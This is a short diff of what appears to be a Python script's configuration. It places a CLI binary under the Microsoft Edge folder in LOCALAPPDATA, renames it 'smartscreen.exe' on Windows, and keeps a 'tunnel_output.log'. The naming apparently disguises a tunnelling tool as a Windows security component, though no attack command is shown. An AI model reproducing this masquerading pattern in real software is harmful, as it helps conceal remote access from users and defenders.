@@ -21,7 +21,7 @@ TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
 # Change CODE_DIR if the CLI binary lives somewhere else, such as AppData\Roaming.
-CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge", "SmartScreen"))
+CODE_DIR = Path(os.path.join(os.getenv("LOCALAPPDATA", ""), "Microsoft", "Edge"))
 CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
 CODE_EXE = CODE_DIR / CODE_EXE_NAME
 TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
